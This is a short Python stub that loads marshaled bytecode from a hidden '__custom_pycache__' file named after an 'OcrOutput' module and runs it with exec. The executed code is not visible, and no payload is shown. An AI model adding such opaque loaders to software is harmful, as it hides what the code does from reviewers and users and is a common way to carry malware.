
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'OcrOutput_8326c210ee204fdbb6e235709f95ba66.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
